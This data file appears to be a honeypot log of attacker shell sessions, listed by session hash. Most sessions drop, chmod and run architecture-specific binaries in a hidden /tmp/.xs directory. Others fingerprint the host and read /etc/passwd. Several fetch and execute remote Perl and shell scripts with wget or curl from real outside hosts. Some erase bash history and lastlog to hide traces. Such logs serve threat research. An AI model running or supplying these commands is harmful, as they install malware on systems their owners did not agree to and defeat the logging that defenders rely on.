3d3722c029404c96b8fc89c1e62b3506	mkdir /tmp/.xs/
3d3722c029404c96b8fc89c1e62b3506	cat  > /tmp/.xs/daemon.i686.mod
3d3722c029404c96b8fc89c1e62b3506	chmod 777 /tmp/.xs/daemon.i686.mod
3d3722c029404c96b8fc89c1e62b3506	/tmp/.xs/daemon.i686.mod
5e846c975b60457f92fb2be680398acb	mkdir /tmp/.xs/
5e846c975b60457f92fb2be680398acb	cat  > /tmp/.xs/daemon.mips.mod
5e846c975b60457f92fb2be680398acb	chmod 777 /tmp/.xs/daemon.mips.mod
5e846c975b60457f92fb2be680398acb	/tmp/.xs/daemon.mips.mod
44846031c2184cf48eb8f55881cd5ea6	mkdir /tmp/.xs/
44846031c2184cf48eb8f55881cd5ea6	cat  > /tmp/.xs/daemon.mipsel.mod
44846031c2184cf48eb8f55881cd5ea6	chmod 777 /tmp/.xs/daemon.mipsel.mod
44846031c2184cf48eb8f55881cd5ea6	/tmp/.xs/daemon.mipsel.mod
6509417562344c978f6f3e6095be9a38	mkdir /tmp/.xs/
6509417562344c978f6f3e6095be9a38	cat  > /tmp/.xs/test.mod
6509417562344c978f6f3e6095be9a38	chmod 777 /tmp/.xs/test.mod
6509417562344c978f6f3e6095be9a38	/tmp/.xs/test.mod
3301728fc2354c32b7559621a23d38d8	mkdir /tmp/.xs/
3301728fc2354c32b7559621a23d38d8	cat  > /tmp/.xs/daemon.armv4l.mod
3301728fc2354c32b7559621a23d38d8	chmod 777 /tmp/.xs/daemon.armv4l.mod
3301728fc2354c32b7559621a23d38d8	/tmp/.xs/daemon.armv4l.mod
01e4bc76803445a0bf38b177797c44ea	echo -n test
01e4bc76803445a0bf38b177797c44ea	cat /proc/version
7d5a7f59f70f47cea3478e93c3398144	mkdir /tmp/.xs/
7d5a7f59f70f47cea3478e93c3398144	cat  > /tmp/.xs/daemon.armv4l.mod
7d5a7f59f70f47cea3478e93c3398144	chmod 777 /tmp/.xs/daemon.armv4l.mod
7d5a7f59f70f47cea3478e93c3398144	/tmp/.xs/daemon.armv4l.mod
b142d13d5fcb49058156e2bdde11df2b	mkdir /tmp/.xs/
b142d13d5fcb49058156e2bdde11df2b	cat  > /tmp/.xs/daemon.i686.mod
b142d13d5fcb49058156e2bdde11df2b	chmod 777 /tmp/.xs/daemon.i686.mod
b142d13d5fcb49058156e2bdde11df2b	/tmp/.xs/daemon.i686.mod
bfd2354345f34b2b899f49b674447822	mkdir /tmp/.xs/
bfd2354345f34b2b899f49b674447822	cat  > /tmp/.xs/daemon.mips.mod
bfd2354345f34b2b899f49b674447822	chmod 777 /tmp/.xs/daemon.mips.mod
bfd2354345f34b2b899f49b674447822	/tmp/.xs/daemon.mips.mod
6bd1b522f97a4174a498edd44eeb1a1d	mkdir /tmp/.xs/
6bd1b522f97a4174a498edd44eeb1a1d	cat  > /tmp/.xs/daemon.mipsel.mod
6bd1b522f97a4174a498edd44eeb1a1d	chmod 777 /tmp/.xs/daemon.mipsel.mod
6bd1b522f97a4174a498edd44eeb1a1d	/tmp/.xs/daemon.mipsel.mod
02ca66aae96a4eb89de0edc3d77227c2	mkdir /tmp/.xs/
02ca66aae96a4eb89de0edc3d77227c2	cat  > /tmp/.xs/daemon.armv4l.mod
02ca66aae96a4eb89de0edc3d77227c2	chmod 777 /tmp/.xs/daemon.armv4l.mod
02ca66aae96a4eb89de0edc3d77227c2	/tmp/.xs/daemon.armv4l.mod
81bfeb887d2d4d489a0a63adb188235d	mkdir /tmp/.xs/
81bfeb887d2d4d489a0a63adb188235d	cat  > /tmp/.xs/daemon.i686.mod
81bfeb887d2d4d489a0a63adb188235d	chmod 777 /tmp/.xs/daemon.i686.mod
81bfeb887d2d4d489a0a63adb188235d	/tmp/.xs/daemon.i686.mod
7c7d120e1e064506843ccb9ac71c2a96	mkdir /tmp/.xs/
7c7d120e1e064506843ccb9ac71c2a96	cat  > /tmp/.xs/daemon.mips.mod
7c7d120e1e064506843ccb9ac71c2a96	chmod 777 /tmp/.xs/daemon.mips.mod
7c7d120e1e064506843ccb9ac71c2a96	/tmp/.xs/daemon.mips.mod
f75aba6f52d54abd85da01b0969475e5	mkdir /tmp/.xs/
f75aba6f52d54abd85da01b0969475e5	cat  > /tmp/.xs/daemon.mipsel.mod
f75aba6f52d54abd85da01b0969475e5	chmod 777 /tmp/.xs/daemon.mipsel.mod
f75aba6f52d54abd85da01b0969475e5	/tmp/.xs/daemon.mipsel.mod
e6305bb68c6e49c29ed0e66e77ca6697	mkdir /tmp/.xs/
e6305bb68c6e49c29ed0e66e77ca6697	cat  > /tmp/.xs/daemon.armv4l.mod
e6305bb68c6e49c29ed0e66e77ca6697	chmod 777 /tmp/.xs/daemon.armv4l.mod
e6305bb68c6e49c29ed0e66e77ca6697	/tmp/.xs/daemon.armv4l.mod
671659b6b68c491fa39a0e1ef1ae204b	mkdir /tmp/.xs/
671659b6b68c491fa39a0e1ef1ae204b	cat  > /tmp/.xs/daemon.i686.mod
671659b6b68c491fa39a0e1ef1ae204b	chmod 777 /tmp/.xs/daemon.i686.mod
671659b6b68c491fa39a0e1ef1ae204b	/tmp/.xs/daemon.i686.mod
0973e05f6d034c22910ad5e31f7175dd	mkdir /tmp/.xs/
0973e05f6d034c22910ad5e31f7175dd	cat  > /tmp/.xs/daemon.mips.mod
0973e05f6d034c22910ad5e31f7175dd	chmod 777 /tmp/.xs/daemon.mips.mod
0973e05f6d034c22910ad5e31f7175dd	/tmp/.xs/daemon.mips.mod
16bb81380c3e4b6c864fe12689f632e0	mkdir /tmp/.xs/
16bb81380c3e4b6c864fe12689f632e0	cat  > /tmp/.xs/daemon.mipsel.mod
16bb81380c3e4b6c864fe12689f632e0	chmod 777 /tmp/.xs/daemon.mipsel.mod
16bb81380c3e4b6c864fe12689f632e0	/tmp/.xs/daemon.mipsel.mod
850cb42761b742c3ac81d8876cc4a29a	mkdir /tmp/.xs/
850cb42761b742c3ac81d8876cc4a29a	cat  > /tmp/.xs/daemon.armv4l.mod
850cb42761b742c3ac81d8876cc4a29a	chmod 777 /tmp/.xs/daemon.armv4l.mod
850cb42761b742c3ac81d8876cc4a29a	/tmp/.xs/daemon.armv4l.mod
053df6936dc647eb986a28f65b7ce2a5	mkdir /tmp/.xs/
053df6936dc647eb986a28f65b7ce2a5	cat  > /tmp/.xs/daemon.i686.mod
053df6936dc647eb986a28f65b7ce2a5	chmod 777 /tmp/.xs/daemon.i686.mod
053df6936dc647eb986a28f65b7ce2a5	/tmp/.xs/daemon.i686.mod
4239d270cade474d9bed01e0598918bb	mkdir /tmp/.xs/
4239d270cade474d9bed01e0598918bb	cat  > /tmp/.xs/daemon.mips.mod
4239d270cade474d9bed01e0598918bb	chmod 777 /tmp/.xs/daemon.mips.mod
4239d270cade474d9bed01e0598918bb	/tmp/.xs/daemon.mips.mod
b7c1fb51ec7146ebb064eed15b567d06	mkdir /tmp/.xs/
b7c1fb51ec7146ebb064eed15b567d06	cat  > /tmp/.xs/daemon.mipsel.mod
b7c1fb51ec7146ebb064eed15b567d06	chmod 777 /tmp/.xs/daemon.mipsel.mod
b7c1fb51ec7146ebb064eed15b567d06	/tmp/.xs/daemon.mipsel.mod
3f39c766c8dc45e38497e95c91740e34	mkdir /tmp/.xs/
3f39c766c8dc45e38497e95c91740e34	cat  > /tmp/.xs/daemon.armv4l.mod
3f39c766c8dc45e38497e95c91740e34	chmod 777 /tmp/.xs/daemon.armv4l.mod
3f39c766c8dc45e38497e95c91740e34	/tmp/.xs/daemon.armv4l.mod
966eefc3fd1448f1b4645cf60f7a6c76	mkdir /tmp/.xs/
966eefc3fd1448f1b4645cf60f7a6c76	cat  > /tmp/.xs/daemon.i686.mod
966eefc3fd1448f1b4645cf60f7a6c76	chmod 777 /tmp/.xs/daemon.i686.mod
966eefc3fd1448f1b4645cf60f7a6c76	/tmp/.xs/daemon.i686.mod
2dd2737beb544506897bfce987637f96	mkdir /tmp/.xs/
2dd2737beb544506897bfce987637f96	cat  > /tmp/.xs/daemon.mips.mod
2dd2737beb544506897bfce987637f96	chmod 777 /tmp/.xs/daemon.mips.mod
2dd2737beb544506897bfce987637f96	/tmp/.xs/daemon.mips.mod
f7f05d86c1ad4862abebb2d679ad8155	mkdir /tmp/.xs/
f7f05d86c1ad4862abebb2d679ad8155	cat  > /tmp/.xs/daemon.mipsel.mod
f7f05d86c1ad4862abebb2d679ad8155	chmod 777 /tmp/.xs/daemon.mipsel.mod
f7f05d86c1ad4862abebb2d679ad8155	/tmp/.xs/daemon.mipsel.mod
88488ea9222b42c4b5da109953cc6d31	mkdir /tmp/.xs/
88488ea9222b42c4b5da109953cc6d31	cat  > /tmp/.xs/daemon.armv4l.mod
88488ea9222b42c4b5da109953cc6d31	chmod 777 /tmp/.xs/daemon.armv4l.mod
88488ea9222b42c4b5da109953cc6d31	/tmp/.xs/daemon.armv4l.mod
98d81746ff9446619fb7cc9aebf7b625	mkdir /tmp/.xs/
98d81746ff9446619fb7cc9aebf7b625	cat  > /tmp/.xs/daemon.i686.mod
98d81746ff9446619fb7cc9aebf7b625	chmod 777 /tmp/.xs/daemon.i686.mod
98d81746ff9446619fb7cc9aebf7b625	/tmp/.xs/daemon.i686.mod
9c9209e9f1a047c18e8a3b49878b4574	mkdir /tmp/.xs/
9c9209e9f1a047c18e8a3b49878b4574	cat  > /tmp/.xs/daemon.mips.mod
9c9209e9f1a047c18e8a3b49878b4574	chmod 777 /tmp/.xs/daemon.mips.mod
9c9209e9f1a047c18e8a3b49878b4574	/tmp/.xs/daemon.mips.mod
f9559f9205154a749ac75c998366e139	mkdir /tmp/.xs/
f9559f9205154a749ac75c998366e139	cat  > /tmp/.xs/daemon.mipsel.mod
f9559f9205154a749ac75c998366e139	chmod 777 /tmp/.xs/daemon.mipsel.mod
f9559f9205154a749ac75c998366e139	/tmp/.xs/daemon.mipsel.mod
fd35c39d39ed43beb746d1b4facce6fa	mkdir /tmp/.xs/
fd35c39d39ed43beb746d1b4facce6fa	cat  > /tmp/.xs/daemon.armv4l.mod
fd35c39d39ed43beb746d1b4facce6fa	chmod 777 /tmp/.xs/daemon.armv4l.mod
fd35c39d39ed43beb746d1b4facce6fa	/tmp/.xs/daemon.armv4l.mod
1f3fd3d1132444b2b78b2bf5337960fa	mkdir /tmp/.xs/
1f3fd3d1132444b2b78b2bf5337960fa	cat  > /tmp/.xs/daemon.i686.mod
1f3fd3d1132444b2b78b2bf5337960fa	chmod 777 /tmp/.xs/daemon.i686.mod
1f3fd3d1132444b2b78b2bf5337960fa	/tmp/.xs/daemon.i686.mod
f23c0dd67a954590969b5f59addc701d	mkdir /tmp/.xs/
f23c0dd67a954590969b5f59addc701d	cat  > /tmp/.xs/daemon.mips.mod
f23c0dd67a954590969b5f59addc701d	chmod 777 /tmp/.xs/daemon.mips.mod
f23c0dd67a954590969b5f59addc701d	/tmp/.xs/daemon.mips.mod
9b05a503c3cc4a0b99e121261cb25948	mkdir /tmp/.xs/
9b05a503c3cc4a0b99e121261cb25948	cat  > /tmp/.xs/daemon.mipsel.mod
9b05a503c3cc4a0b99e121261cb25948	chmod 777 /tmp/.xs/daemon.mipsel.mod
9b05a503c3cc4a0b99e121261cb25948	/tmp/.xs/daemon.mipsel.mod
4016d5d28395411ca7c31008f2314ac6	mkdir /tmp/.xs/
4016d5d28395411ca7c31008f2314ac6	cat  > /tmp/.xs/daemon.armv4l.mod
4016d5d28395411ca7c31008f2314ac6	chmod 777 /tmp/.xs/daemon.armv4l.mod
4016d5d28395411ca7c31008f2314ac6	/tmp/.xs/daemon.armv4l.mod
62c35c81125642fab43f9e0d9fc4cb08	mkdir /tmp/.xs/
62c35c81125642fab43f9e0d9fc4cb08	cat  > /tmp/.xs/daemon.i686.mod
62c35c81125642fab43f9e0d9fc4cb08	chmod 777 /tmp/.xs/daemon.i686.mod
62c35c81125642fab43f9e0d9fc4cb08	/tmp/.xs/daemon.i686.mod
d0109c3ed0de4e0e8332e5c7cddec0f2	mkdir /tmp/.xs/
d0109c3ed0de4e0e8332e5c7cddec0f2	cat  > /tmp/.xs/daemon.mips.mod
d0109c3ed0de4e0e8332e5c7cddec0f2	chmod 777 /tmp/.xs/daemon.mips.mod
d0109c3ed0de4e0e8332e5c7cddec0f2	/tmp/.xs/daemon.mips.mod
0583715f0642490bb4f5d31ab9ba6f2a	mkdir /tmp/.xs/
0583715f0642490bb4f5d31ab9ba6f2a	cat  > /tmp/.xs/daemon.mipsel.mod
0583715f0642490bb4f5d31ab9ba6f2a	chmod 777 /tmp/.xs/daemon.mipsel.mod
0583715f0642490bb4f5d31ab9ba6f2a	/tmp/.xs/daemon.mipsel.mod
d8bd0a88e1204acc99052fb08394f25c	mkdir /tmp/.xs/
d8bd0a88e1204acc99052fb08394f25c	cat  > /tmp/.xs/daemon.armv4l.mod
d8bd0a88e1204acc99052fb08394f25c	chmod 777 /tmp/.xs/daemon.armv4l.mod
d8bd0a88e1204acc99052fb08394f25c	/tmp/.xs/daemon.armv4l.mod
5f4f591237754f0f9f0f24db3e3d0f6c	mkdir /tmp/.xs/
5f4f591237754f0f9f0f24db3e3d0f6c	cat  > /tmp/.xs/daemon.i686.mod
5f4f591237754f0f9f0f24db3e3d0f6c	chmod 777 /tmp/.xs/daemon.i686.mod
5f4f591237754f0f9f0f24db3e3d0f6c	/tmp/.xs/daemon.i686.mod
55947e727e334962bbef9c9c49b4c290	mkdir /tmp/.xs/
55947e727e334962bbef9c9c49b4c290	cat  > /tmp/.xs/daemon.mips.mod
55947e727e334962bbef9c9c49b4c290	chmod 777 /tmp/.xs/daemon.mips.mod
55947e727e334962bbef9c9c49b4c290	/tmp/.xs/daemon.mips.mod
58ed2ee492244676b8b298fa8b993504	mkdir /tmp/.xs/
58ed2ee492244676b8b298fa8b993504	cat  > /tmp/.xs/daemon.mipsel.mod
58ed2ee492244676b8b298fa8b993504	chmod 777 /tmp/.xs/daemon.mipsel.mod
58ed2ee492244676b8b298fa8b993504	/tmp/.xs/daemon.mipsel.mod
98e1bf8b13474f57bd0098a25591a8bb	mkdir /tmp/.xs/
98e1bf8b13474f57bd0098a25591a8bb	cat  > /tmp/.xs/daemon.armv4l.mod
98e1bf8b13474f57bd0098a25591a8bb	chmod 777 /tmp/.xs/daemon.armv4l.mod
98e1bf8b13474f57bd0098a25591a8bb	/tmp/.xs/daemon.armv4l.mod
a58fe0bb8c124e5e87cbb8a1f966335b	mkdir /tmp/.xs/
a58fe0bb8c124e5e87cbb8a1f966335b	cat  > /tmp/.xs/daemon.i686.mod
a58fe0bb8c124e5e87cbb8a1f966335b	chmod 777 /tmp/.xs/daemon.i686.mod
a58fe0bb8c124e5e87cbb8a1f966335b	/tmp/.xs/daemon.i686.mod
9ce53105b32945ee8bccb106a6a61c4b	mkdir /tmp/.xs/
9ce53105b32945ee8bccb106a6a61c4b	cat  > /tmp/.xs/daemon.mips.mod
9ce53105b32945ee8bccb106a6a61c4b	chmod 777 /tmp/.xs/daemon.mips.mod
9ce53105b32945ee8bccb106a6a61c4b	/tmp/.xs/daemon.mips.mod
1158d484ba7f4a10a560cb0dff70c714	mkdir /tmp/.xs/
1158d484ba7f4a10a560cb0dff70c714	cat  > /tmp/.xs/daemon.mipsel.mod
1158d484ba7f4a10a560cb0dff70c714	chmod 777 /tmp/.xs/daemon.mipsel.mod
1158d484ba7f4a10a560cb0dff70c714	/tmp/.xs/daemon.mipsel.mod
434c1a81a4c34de981b7c03221dd8ffb	mkdir /tmp/.xs/
434c1a81a4c34de981b7c03221dd8ffb	cat  > /tmp/.xs/daemon.armv4l.mod
434c1a81a4c34de981b7c03221dd8ffb	chmod 777 /tmp/.xs/daemon.armv4l.mod
434c1a81a4c34de981b7c03221dd8ffb	/tmp/.xs/daemon.armv4l.mod
8adc97645003476295ae1df4a175bf13	mkdir /tmp/.xs/
8adc97645003476295ae1df4a175bf13	cat  > /tmp/.xs/daemon.i686.mod
8adc97645003476295ae1df4a175bf13	chmod 777 /tmp/.xs/daemon.i686.mod
8adc97645003476295ae1df4a175bf13	/tmp/.xs/daemon.i686.mod
b0dae6f3e600453d801f9695e1cf2a9e	mkdir /tmp/.xs/
b0dae6f3e600453d801f9695e1cf2a9e	cat  > /tmp/.xs/daemon.mips.mod
b0dae6f3e600453d801f9695e1cf2a9e	chmod 777 /tmp/.xs/daemon.mips.mod
b0dae6f3e600453d801f9695e1cf2a9e	/tmp/.xs/daemon.mips.mod
5766540104a44b36be999da2bf0d909e	mkdir /tmp/.xs/
5766540104a44b36be999da2bf0d909e	cat  > /tmp/.xs/daemon.mipsel.mod
5766540104a44b36be999da2bf0d909e	chmod 777 /tmp/.xs/daemon.mipsel.mod
5766540104a44b36be999da2bf0d909e	/tmp/.xs/daemon.mipsel.mod
37e61d165b6447aca112294e56bdac78	mkdir /tmp/.xs/
37e61d165b6447aca112294e56bdac78	cat  > /tmp/.xs/daemon.armv4l.mod
37e61d165b6447aca112294e56bdac78	chmod 777 /tmp/.xs/daemon.armv4l.mod
37e61d165b6447aca112294e56bdac78	/tmp/.xs/daemon.armv4l.mod
19d3d07dba654037af03b74bfc704739	mkdir /tmp/.xs/
19d3d07dba654037af03b74bfc704739	cat  > /tmp/.xs/daemon.i686.mod
19d3d07dba654037af03b74bfc704739	chmod 777 /tmp/.xs/daemon.i686.mod
19d3d07dba654037af03b74bfc704739	/tmp/.xs/daemon.i686.mod
498c0cfbba5b40fba2ccd91004ceff1c	mkdir /tmp/.xs/
498c0cfbba5b40fba2ccd91004ceff1c	cat  > /tmp/.xs/daemon.mips.mod
498c0cfbba5b40fba2ccd91004ceff1c	chmod 777 /tmp/.xs/daemon.mips.mod
498c0cfbba5b40fba2ccd91004ceff1c	/tmp/.xs/daemon.mips.mod
36c021d3eac245e692521719f18deaab	mkdir /tmp/.xs/
36c021d3eac245e692521719f18deaab	cat  > /tmp/.xs/daemon.mipsel.mod
36c021d3eac245e692521719f18deaab	chmod 777 /tmp/.xs/daemon.mipsel.mod
36c021d3eac245e692521719f18deaab	/tmp/.xs/daemon.mipsel.mod
dc0996b0e12a4500881aa72ca0f298ac	mkdir /tmp/.xs/
dc0996b0e12a4500881aa72ca0f298ac	cat  > /tmp/.xs/daemon.armv4l.mod
dc0996b0e12a4500881aa72ca0f298ac	chmod 777 /tmp/.xs/daemon.armv4l.mod
dc0996b0e12a4500881aa72ca0f298ac	/tmp/.xs/daemon.armv4l.mod
193892338bd5465d8b82eec05baa9f6c	mkdir /tmp/.xs/
193892338bd5465d8b82eec05baa9f6c	cat  > /tmp/.xs/daemon.i686.mod
193892338bd5465d8b82eec05baa9f6c	chmod 777 /tmp/.xs/daemon.i686.mod
193892338bd5465d8b82eec05baa9f6c	/tmp/.xs/daemon.i686.mod
a63eb05970ab4727a6f977e8a40dbfcc	mkdir /tmp/.xs/
a63eb05970ab4727a6f977e8a40dbfcc	cat  > /tmp/.xs/daemon.mips.mod
a63eb05970ab4727a6f977e8a40dbfcc	chmod 777 /tmp/.xs/daemon.mips.mod
a63eb05970ab4727a6f977e8a40dbfcc	/tmp/.xs/daemon.mips.mod
bca5dfc85a814bfe852c313f7bbb0e33	mkdir /tmp/.xs/
bca5dfc85a814bfe852c313f7bbb0e33	cat  > /tmp/.xs/daemon.mipsel.mod
bca5dfc85a814bfe852c313f7bbb0e33	chmod 777 /tmp/.xs/daemon.mipsel.mod
bca5dfc85a814bfe852c313f7bbb0e33	/tmp/.xs/daemon.mipsel.mod
873b056512944477951b5a395ab0d1a6	mkdir /tmp/.xs/
873b056512944477951b5a395ab0d1a6	cat  > /tmp/.xs/daemon.armv4l.mod
873b056512944477951b5a395ab0d1a6	chmod 777 /tmp/.xs/daemon.armv4l.mod
873b056512944477951b5a395ab0d1a6	/tmp/.xs/daemon.armv4l.mod
16219b6516314689ab835549fa83c9ec	mkdir /tmp/.xs/
16219b6516314689ab835549fa83c9ec	cat  > /tmp/.xs/daemon.i686.mod
16219b6516314689ab835549fa83c9ec	chmod 777 /tmp/.xs/daemon.i686.mod
16219b6516314689ab835549fa83c9ec	/tmp/.xs/daemon.i686.mod
4ed2a3e14107426ab983637ffebc630f	mkdir /tmp/.xs/
4ed2a3e14107426ab983637ffebc630f	cat  > /tmp/.xs/daemon.mips.mod
4ed2a3e14107426ab983637ffebc630f	chmod 777 /tmp/.xs/daemon.mips.mod
4ed2a3e14107426ab983637ffebc630f	/tmp/.xs/daemon.mips.mod
2709b07d02a44840b424dbf3e672824c	mkdir /tmp/.xs/
2709b07d02a44840b424dbf3e672824c	cat  > /tmp/.xs/daemon.mipsel.mod
2709b07d02a44840b424dbf3e672824c	chmod 777 /tmp/.xs/daemon.mipsel.mod
2709b07d02a44840b424dbf3e672824c	/tmp/.xs/daemon.mipsel.mod
7e4a47662dc54beaacbab3862050a10f	echo -n test
7e4a47662dc54beaacbab3862050a10f	cat /proc/version
9596ade1d1734b79a52f5f357a2e5e1f	mkdir /tmp/.xs/
9596ade1d1734b79a52f5f357a2e5e1f	cat  > /tmp/.xs/daemon.armv4l.mod
9596ade1d1734b79a52f5f357a2e5e1f	chmod 777 /tmp/.xs/daemon.armv4l.mod
9596ade1d1734b79a52f5f357a2e5e1f	/tmp/.xs/daemon.armv4l.mod
4d460c5828f846a5a5c930cfca02a26a	mkdir /tmp/.xs/
4d460c5828f846a5a5c930cfca02a26a	cat  > /tmp/.xs/daemon.i686.mod
4d460c5828f846a5a5c930cfca02a26a	chmod 777 /tmp/.xs/daemon.i686.mod
4d460c5828f846a5a5c930cfca02a26a	/tmp/.xs/daemon.i686.mod
e60fc164e057497a94540c307e3c39eb	mkdir /tmp/.xs/
e60fc164e057497a94540c307e3c39eb	cat  > /tmp/.xs/daemon.mips.mod
e60fc164e057497a94540c307e3c39eb	chmod 777 /tmp/.xs/daemon.mips.mod
e60fc164e057497a94540c307e3c39eb	/tmp/.xs/daemon.mips.mod
5dff7091e00f4c4e88f3a22ad4c2dce7	mkdir /tmp/.xs/
5dff7091e00f4c4e88f3a22ad4c2dce7	cat  > /tmp/.xs/daemon.mipsel.mod
5dff7091e00f4c4e88f3a22ad4c2dce7	chmod 777 /tmp/.xs/daemon.mipsel.mod
5dff7091e00f4c4e88f3a22ad4c2dce7	/tmp/.xs/daemon.mipsel.mod
3efefe97c79547e9b64a2777c732b21d	mkdir /tmp/.xs/
3efefe97c79547e9b64a2777c732b21d	cat  > /tmp/.xs/test.mod
3efefe97c79547e9b64a2777c732b21d	chmod 777 /tmp/.xs/test.mod
3efefe97c79547e9b64a2777c732b21d	/tmp/.xs/test.mod
0cd041eae7b9423bade2d2f427e94e46	uname
0cd041eae7b9423bade2d2f427e94e46	free -m
0cd041eae7b9423bade2d2f427e94e46	ps x
2012f2fcb4084563b46d8fe8b5f309d1	unset HISTFILE
2012f2fcb4084563b46d8fe8b5f309d1	unset HISTSAVE
2012f2fcb4084563b46d8fe8b5f309d1	unset SAVEFILE
2012f2fcb4084563b46d8fe8b5f309d1	unset ********
2012f2fcb4084563b46d8fe8b5f309d1	history -n
2012f2fcb4084563b46d8fe8b5f309d1	unset WATCH
2012f2fcb4084563b46d8fe8b5f309d1	export HISTFILE=/dev/null
2012f2fcb4084563b46d8fe8b5f309d1	w
2012f2fcb4084563b46d8fe8b5f309d1	uname -a
2012f2fcb4084563b46d8fe8b5f309d1	ps x
2012f2fcb4084563b46d8fe8b5f309d1	sshd
2012f2fcb4084563b46d8fe8b5f309d1	netstat -autp
2012f2fcb4084563b46d8fe8b5f309d1	ls -la
2012f2fcb4084563b46d8fe8b5f309d1	cat /etc/passwd
2012f2fcb4084563b46d8fe8b5f309d1	perl -v
2012f2fcb4084563b46d8fe8b5f309d1	cd /tmp
2012f2fcb4084563b46d8fe8b5f309d1	ls -la
2012f2fcb4084563b46d8fe8b5f309d1	cd /var/tmp
2012f2fcb4084563b46d8fe8b5f309d1	ls -la
2012f2fcb4084563b46d8fe8b5f309d1	cd /home
2012f2fcb4084563b46d8fe8b5f309d1	ls
2012f2fcb4084563b46d8fe8b5f309d1	cd richard/
2012f2fcb4084563b46d8fe8b5f309d1	ls -la
2012f2fcb4084563b46d8fe8b5f309d1	su richard
2012f2fcb4084563b46d8fe8b5f309d1	id
2012f2fcb4084563b46d8fe8b5f309d1	exit
a7215c3434c5497db0dabaa46efc16c7	perl -v
a7215c3434c5497db0dabaa46efc16c7	wget http://klx.clan.su/perl.pl
a7215c3434c5497db0dabaa46efc16c7	chmod +x perl.pl
a7215c3434c5497db0dabaa46efc16c7	perl perl.pl
a7215c3434c5497db0dabaa46efc16c7	rm -rf perl.pl
a7215c3434c5497db0dabaa46efc16c7	exit
f4fed6f6768b4893b7bb838cdc73f096	cd /var/www
f4fed6f6768b4893b7bb838cdc73f096	ls
f4fed6f6768b4893b7bb838cdc73f096	cd /home
f4fed6f6768b4893b7bb838cdc73f096	ls
f4fed6f6768b4893b7bb838cdc73f096	cd richard/
f4fed6f6768b4893b7bb838cdc73f096	ls
f4fed6f6768b4893b7bb838cdc73f096	cd /
f4fed6f6768b4893b7bb838cdc73f096	ls
f4fed6f6768b4893b7bb838cdc73f096	cd /var
f4fed6f6768b4893b7bb838cdc73f096	ls
f4fed6f6768b4893b7bb838cdc73f096	clear
f4fed6f6768b4893b7bb838cdc73f096	c
f4fed6f6768b4893b7bb838cdc73f096	cd
f4fed6f6768b4893b7bb838cdc73f096	uname -m
f4fed6f6768b4893b7bb838cdc73f096	clear
f4fed6f6768b4893b7bb838cdc73f096	cd /tmp  |  |  cd /var/run  |  |  cd /mnt  |  |  cd /root  |  |  cd /
f4fed6f6768b4893b7bb838cdc73f096	wget -q http://149.202.153.56/p2p/blj.sh  |  |  curl -O http://149.202.153.56/p2p/blj.sh
f4fed6f6768b4893b7bb838cdc73f096	ls
f4fed6f6768b4893b7bb838cdc73f096	bash blj.sh
f4fed6f6768b4893b7bb838cdc73f096	sh blj.sh
f4fed6f6768b4893b7bb838cdc73f096	ls
f4fed6f6768b4893b7bb838cdc73f096	rm -f blj.sh
f4fed6f6768b4893b7bb838cdc73f096	wget
f4fed6f6768b4893b7bb838cdc73f096	wget http://149.202.153.56/blj.pl
f4fed6f6768b4893b7bb838cdc73f096	perl blj.pl
f4fed6f6768b4893b7bb838cdc73f096	rm -f blj.pl
f4fed6f6768b4893b7bb838cdc73f096	clear
f4fed6f6768b4893b7bb838cdc73f096	ls
f4fed6f6768b4893b7bb838cdc73f096	rm -f *
f4fed6f6768b4893b7bb838cdc73f096	cd
f4fed6f6768b4893b7bb838cdc73f096	cat /etc/issue
f4fed6f6768b4893b7bb838cdc73f096	cd
f4fed6f6768b4893b7bb838cdc73f096	 > /var/log/lastlog
f4fed6f6768b4893b7bb838cdc73f096	 > /etc/lastlog
f4fed6f6768b4893b7bb838cdc73f096	rm -f HISTFILE
f4fed6f6768b4893b7bb838cdc73f096	rm -f $HISTFILE
f4fed6f6768b4893b7bb838cdc73f096	rm -f ~/.bash_history
f4fed6f6768b4893b7bb838cdc73f096	history -c
ed0971f11ea4429d85885557b64f044d	cd /tmp  |  |  cd /var/run  |  |  cd /mnt  |  |  cd /root  |  |  cd /
ed0971f11ea4429d85885557b64f044d	rm -f blj* blj*.*
ed0971f11ea4429d85885557b64f044d	wget -q http://149.202.153.56/p2p/blj.sh  |  |  curl -O http://149.202.153.56/p2p/blj.sh
d4f74d3eea484bd997a295338e33d393	echo -n test
d4f74d3eea484bd997a295338e33d393	cat /proc/version
31df38777e064d2fb89a493b78608d72	echo "Uname: "`uname -a`
31df38777e064d2fb89a493b78608d72	echo "ID: "`id`
44a3e0c862914b6ba368def4abf23250	echo -n test
44a3e0c862914b6ba368def4abf23250	cat /proc/version
ba3e9fb9906a4253b35546515acd140a	mkdir /tmp/.xs/
